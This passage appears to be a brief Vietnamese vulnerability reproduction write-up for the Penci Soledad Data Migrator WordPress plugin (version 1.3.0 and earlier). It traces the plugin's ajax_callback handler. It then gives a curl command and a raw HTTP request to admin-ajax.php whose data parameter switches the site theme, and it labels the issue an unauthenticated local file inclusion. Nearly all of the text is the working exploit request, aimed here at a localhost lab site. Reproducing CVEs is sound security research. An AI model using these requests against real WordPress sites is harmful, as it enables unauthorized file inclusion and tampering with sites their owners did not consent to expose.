
# setup Plugin Penci Soledad Data Migrator <= 1.3.0

tìm biến $data
![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/9c91d0a3-1fd3-4677-8bce-fcb421232c11)

Thấy biến data ở trong function ajax_callback

![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/32ebd30b-c795-4336-b558-2323ad7562e5)

Từ đoạn source code 

```
curl -X POST https://yourwordpresssite.com/wp-admin/admin-ajax.php \
  -H "Content-Type: application/x-www-form-urlencoded" \
  --data-urlencode "action=your_ajax_action" \
  --data-urlencode "nonce=your_ajax_nonce" \
  --data-urlencode "data=theme=bimber&force_switch_posts=1" \
  --data-urlencode "post_id=123"
```

![image](https://github.com/Nguyen-Trung-Kien/Wordpress-CVE--Reproduct/assets/65381453/b54c0051-f8fd-421d-b98c-76ea3505a06c)
```
POST /wp-admin/admin-ajax.php HTTP/1.1
Host: localhost:8088
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://localhost:8088/wp-admin/plugins.php?plugin_status=all&paged=1&s
X-Requested-With: XMLHttpRequest
Origin: http://localhost:8088
Connection: close
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Content-Type: application/x-www-form-urlencoded
Content-Length: 94

action=penci_migrator_ajax&nonce=a63ea37d9c&data=theme=bimber&force_switch_posts=1&post_id=123
```
Unauthenticated LFI, đổi theme
